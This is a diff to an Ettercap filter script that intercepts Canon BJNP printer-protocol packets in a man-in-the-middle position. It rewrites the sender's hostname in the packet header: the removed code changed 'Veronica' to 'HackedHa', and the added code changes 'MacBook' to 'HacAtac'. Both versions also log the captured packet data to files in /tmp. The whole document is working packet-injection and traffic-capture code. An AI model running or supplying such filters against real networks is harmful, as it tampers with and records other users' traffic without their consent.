@@ -1,27 +1,17 @@
 if (ip.proto == UDP) {
 	if (search(DECODED.data, "BJNP")) {
-		# Look's for "Veronica" in header and replaces with "HackedHa"
-		if (search(DECODED.data, "\x56\x00\x65\x00\x72\x00\x6f\x00\x6e\x00\x69\x00\x63\x00\x61")) {
-			replace("\x56\x00\x65\x00\x72\x00\x6f\x00\x6e\x00\x69\x00\x63\x00\x61","\x48\x00\x61\x00\x63\x00\x6b\x00\x65\x00\x64\x00\x68\x00\x61");
-			msg("found Veronica UDP!\n");
-			log(DECODED.data, "/tmp/etterlogFilePineDECODED.log");
-			log(DATA.data, "/tmp/etterlogFilePine.log");
-		}
-		log(DATA.data, "/tmp/NameUDP.log");
-		msg("found BJNP UDP");
-	}
-}
+		msg("BJNP (udp) packet found!");
+		# Look's for "MacBook" in header and modify
+		if (search(DATA.data, "\x4d\x00\x61\x00\x63\x00\x42\x00\x6f\x00\x6f\x00\x6b")) {
+			msg("User is printing from a Mac!\n");
 
-if (ip.proto == TCP) {
-	if (search(DECODED.data, "BJNP")) {	
-		# Look's for "Veronica" in header and replaces with "HackedHa"
-		if (search(DECODED.data, "\x56\x00\x65\x00\x72\x00\x6f\x00\x6e\x00\x69\x00\x63\x00\x61")) {
-			replace("\x56\x00\x65\x00\x72\x00\x6f\x00\x6e\x00\x69\x00\x63\x00\x61","\x48\x00\x61\x00\x63\x00\x6b\x00\x65\x00\x64\x00\x68\x00\x61");
-			msg("found Veronica TCP!\n");
-			log(DECODED.data, "/tmp/etterlogFilePineTCPDECODED.log");
-			log(DATA.data, "/tmp/etterlogFilePineTCP.log");
+			log(DATA.data, "/tmp/BJNP_Header.log");
+
+			replace("\x4d\x00\x61\x00\x63\x00\x42\x00\x6f\x00\x6f\x00\x6b", "\x48\x00\x61\x00\x63\x00\x41\x00\x74\x00\x61\x00\x63");
+
+			msg("Packet BJNP header has been modified!");
+
+			log(DATA.data, "/tmp/BJNP_Header_Change.log");
 		}
-		log(DATA.data, "/tmp/NameTCP.log");
-		#msg("found BJNP TCP");
 	}
 }
